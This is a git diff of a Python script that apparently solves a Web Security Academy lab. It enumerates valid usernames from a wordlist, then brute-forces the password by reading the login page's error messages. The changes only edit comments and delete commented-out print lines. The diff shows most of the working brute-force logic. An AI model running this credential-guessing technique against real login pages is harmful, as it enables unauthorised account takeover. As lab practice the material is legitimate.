@@ -3,8 +3,8 @@
 import requests
 from termcolor import colored
 
-url = "https://0ab9003b03ada268c0db0ece00620056.web-security-academy.net/login"
-cookies = {"session": "d9lEPlY1nd5XxWHQmj5KfCWhiV9wRaf9"} # Change it with your cookies
+url = "https://0ab9003b03ada268c0db0ece00620056.web-security-academy.net/login" # Set the url.
+cookies = {"session": "d9lEPlY1nd5XxWHQmj5KfCWhiV9wRaf9"} # Change it with your session value.
 
 def guess_username():
     with open("/PATH/users_list.txt","r") as file: # Modify it with the users list path.
@@ -16,7 +16,6 @@ def guess_username():
             if "Invalid username" in response.text:
                 print(colored(f"[!!] Invalid user: {username}","red"))
             else:
-                # print(colored(f"[+] Valid username: --> {username}","green"))
                 print(colored(f"[+] Valid username is found... ","green"))
                 return username
                 
@@ -31,7 +30,6 @@ def guess_password(username):
             if "Incorrect password" in response.text:
                 print(colored(f"[!!] Incorrect password: {password}","red"))
             else:
-                # print(colored(f"[+] Valid password: --> {password}","green"))
                 print(colored(f"[+] Valid password is found... ","green"))
                 return password     
 
